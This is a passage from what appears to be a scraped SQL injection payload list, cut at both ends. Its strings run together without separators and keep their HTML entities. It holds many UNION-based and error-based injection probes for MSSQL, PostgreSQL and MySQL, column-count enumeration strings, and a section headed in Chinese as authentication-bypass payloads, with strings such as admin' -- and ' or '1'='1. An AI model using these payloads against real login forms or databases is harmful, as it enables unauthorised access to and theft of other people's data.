ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- UNION ALL SELECT NULL#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#UNION ALL SELECT NULL AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# SQL 注入身份验证绕过有效负载1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&#x27;-&#x27;&#x27; &#x27;&#x27;&amp;&#x27;&#x27;^&#x27;&#x27;*&#x27;&#x27; or &#x27;&#x27;-&#x27;&#x27; or &#x27;&#x27; &#x27;&#x27; or &#x27;&#x27;&amp;&#x27;&#x27; or &#x27;&#x27;^&#x27;&#x27; or &#x27;&#x27;*&#x27;&quot;-&quot;&quot; &quot;&quot;&amp;&quot;&quot;^&quot;&quot;*&quot;&quot; or &quot;&quot;-&quot;&quot; or &quot;&quot; &quot;&quot; or &quot;&quot;&amp;&quot;&quot; or &quot;&quot;^&quot;&quot; or &quot;&quot;*&quot;or true--&quot; or true--&#x27; or true--&quot;) or true--&#x27;) or true--&#x27; or &#x27;x&#x27;=&#x27;x&#x27;) or (&#x27;x&#x27;)=(&#x27;x&#x27;)) or ((&#x27;x&#x27;))=((&#x27;x&quot; or &quot;x&quot;=&quot;x&quot;) or (&quot;x&quot;)=(&quot;x&quot;)) or ((&quot;x&quot;))=((&quot;xor 1=1or 1=1--or 1=1#or 1=1/*admin&#x27; --admin&#x27; #admin&#x27;/*admin&#x27; or &#x27;1&#x27;=&#x27;1admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;#admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;/*admin&#x27;or 1=1 or &#x27;&#x27;=&#x27;admin&#x27; or 1=1admin&#x27; or 1=1--admin&#x27; or 1=1#admin&#x27; or 1=1/*admin&#x27;) or (&#x27;1&#x27;=&#x27;1admin&#x27;) or (&#x27;1&#x27;=&#x27;1&#x27;--admin&#x27;) or (&#x27;1&#x27;=&#x27;1&#x27;#admin&#x27;) or (&#x27;1&#x27;=&#x27;1&#x27;/*admin&#x27;) or &#x27;1&#x27;=&#x27;1admin&#x27;) or &#x27;1&#x27;=&#x27;1&#x27;--admin&#x27;) or &#x27;1&#x27;=&#x27;1&#x27;#admin&#x27;) or &#x27;1&#x27;=&#x27;1&#x27;/*1234 &#x27; AND 1=0 UNION ALL SELECT &#x27;admin&#x27;, &#x27;81dc9bdb52d04dc20036dbd8313ed055admin&quot; --admin&quot; #admin&quot;/*admin&quot; or &quot;1&quot;=&quot;1admin&quot; or &quot;1&quot;=&quot;1&quot;--admin&quot; or &quot;1&quot;=&quot;1&quot;#admin&quot; or &quot;1&quot;=&quot;1&quot;/*admin&quot;or 1=1 or &quot;&quot;=&quot;admin&quot; or 1=1admin&quot; or 1=1--admin&quot; or 1=1#admin&quot; or 1=1/*admin&quot;) or (&quot;1&quot;=&quot;1admin&quot;) or (&quot;1&quot;=&quot;1&quot;--admin&quot;) or (&quot;1&quot;=&quot;1&quot;#admin&quot;) or (&quot;1&quot;=&quot;1&quot;/*admin&quot;) or &quot;1&quot;=&quot;1admin&quot;) or &quot;1&quot;=&quot;1&quot;--admin&quot;) or &quot;1&quot;=&quot;1&quot;#admin&quot;) or &quot;1&quot;=&quot;1&quot;/*1234 &quot; AND 1=0 UNION ALL SELECT &quot;admin&quot;, 